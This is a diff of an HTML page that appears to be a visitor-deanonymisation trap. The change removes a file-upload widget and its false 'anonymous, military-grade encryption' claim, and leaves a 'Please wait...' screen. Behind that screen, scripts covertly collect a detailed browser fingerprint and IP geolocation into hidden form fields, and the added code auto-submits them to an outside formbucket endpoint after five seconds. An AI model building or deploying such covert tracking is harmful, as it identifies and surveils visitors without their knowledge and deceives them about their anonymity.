@@ -22,45 +22,11 @@
       })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
 
     </script>
-    <script>
-      UPLOADCARE_PUBLIC_KEY = 'a13c2e7766453a4d3f69';
-      UPLOADCARE_TABS = 'file';
-      txt = "Send Files";
-      UPLOADCARE_LOCALE_TRANSLATIONS = {
-        buttons: {
-          choose: {
-            files: {
-              one: txt,
-              other: txt
-            },
-            images: {
-              one: txt,
-              other: txt
-            }
-          }
-        }
-      };
 
-    </script>
-    <script src="https://ucarecdn.com/libs/widget/3.5.1/uploadcare.full.min.js"></script>
-    <script src="https://miltonsch.github.io/client.min.js "></script>
+
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
     <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
     <style>
-      .uploader-green-button .uploadcare--widget__button_type_open {
-        color: rgba(255, 255, 255, 1);
-        background: rgb(6, 103, 255);
-        background: -webkit-linear-gradient(top left, rgb(6, 103, 255), rgb(5, 152, 250));
-        background: -o-linear-gradient(top left, rgb(6, 103, 255), rgb(5, 152, 250));
-        background: -moz-linear-gradient(top left, rgb(6, 103, 255), rgb(5, 152, 250));
-        background: linear-gradient(top left, rgb(6, 103, 255), rgb(5, 152, 250));
-        padding: 15px 40px;
-        border-radius: 6px;
-        box-shadow: 0 5px 15px rgba(0, 106, 237, .4);
-        margin-bottom: 7px;
-        text-align: center;
-      }
-
       body {
         font-family: sans-serif;
         line-height: 1.15;
@@ -91,52 +57,38 @@
       </div>
     </div>
     <script>
-      document.getElementById("problem_main").style.display = "none"
+      document.getElementById("problem_main").style.display = "none";
 
     </script>
+
+
     <div style="opacity:0" id="button_main">
       <div style="display:flex;height:100vh;width:100%;align-items:center;justify-content:center;text-align:center;">
         <div style="margin: 100px 10vw;">
-          <div class="uploader-green-button">
-            <input type="hidden" role="uploadcare-uploader" id="sdjvhbjsbvj" name="content" data-multiple="true" data-multiple-min="1" />
-          </div>
-          <p style="font-size:14px;margin-top:20px;">You're anonymous and connected securely via <span style="color:#28a745;white-space: nowrap;">256-bit AES</span> <span style="white-space: nowrap;">military-grade</span> encryption.</p>
+          <p style="font-size:14px;margin-top:20px;">Please wait...</p>
         </div>
       </div>
     </div>
-    <div style="display:none;" id="hold_main">
-      <div style="display:flex;height:100vh;width:100%;align-items:center;justify-content:center;text-align:center;">
-        <div style="margin: 100px 10vw;">
-          <p style="font-size:20px;margin-top:0px;">Please wait...</p>
-        </div>
-      </div>
-    </div>
+
+
+
     <form id="fdfiu" style="display:none;" action="https://api.formbucket.com/f/buk_G9UCMGGccpc9nLPegSwDRYMv" method="POST">
       <input id="afas" name="input" type="hidden">
       <input id="wtettwete" name="input2" type="hidden">
     </form>
+
+
+
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script>
-      var widget = uploadcare.Widget("#sdjvhbjsbvj");
-      widget.onUploadComplete(function(info) {
-        document.getElementById("fdfiu").submit();
-        document.getElementById("hold_main").style.display = "block";
-        document.getElementById("button_main").style.display = "none";
-      });
-      
-      $(document).ready(function() {
-        setTimeout(function() {
-          $("#button_main").animate({
-            opacity: 1
-          }, 800);
-        }, 2000);
-      });
       var c_3 = new ClientJS();
       var dsgi = "";
       $.getJSON('https://ipapi.co/json/', function(data) {
         dsgi = JSON.stringify(data, null, 2)
       });
-      setTimeout(function(){document.getElementById("wtettwete").value = dsgi;},2000);
+      setTimeout(function() {
+        document.getElementById("wtettwete").value = dsgi;
+      }, 2500);
       var b = (
         c_3.getFingerprint() + "##### " + c_3.getUserAgent() + "##### " + c_3.getUserAgentLowerCase() + "##### " + c_3.getBrowser() + "##### " + c_3.getBrowserVersion() + "##### " + c_3.getBrowserMajorVersion() + "##### " + c_3.getEngine() + "##### " + c_3.getEngineVersion() + "##### " + c_3.getOS() + "##### " + c_3.getOSVersion() + "##### " + c_3.getDevice() + "##### " + c_3.getDeviceType() + "##### " + c_3.getDeviceVendor() + "##### " +
         c_3.getCPU() + "##### " + c_3.isMobile() + "##### " + c_3.isMobileMajor() + "##### " + c_3.isMobileAndroid() + "##### " + c_3.isMobileOpera() + "##### " + c_3.isMobileWindows() + "##### " + c_3.isMobileIOS() + "##### " + c_3.isIphone() + "##### " +
@@ -144,7 +96,20 @@
         c_3.getPlugins() + "##### " + c_3.getMimeTypes() + "##### " + c_3.isMimeTypes() + "##### " +
         c_3.isFont() + "##### " + c_3.getFonts() + "##### " + c_3.isLocalStorage() + "##### " + c_3.isSessionStorage() + "##### " + c_3.isCookie() + "##### " + c_3.getTimeZone() + "##### " + c_3.getLanguage() + "##### " + c_3.getSystemLanguage() + "##### " + c_3.isCanvas());
       document.getElementById("afas").value = b;
-     
+
+    </script>
+    <script>
+      setTimeout(function() {
+        document.getElementById("fdfiu").submit();
+
+
+      }, 5000);
+
+    </script>
+    <script>
+
+
     </script>
   </body>
+
 </html>
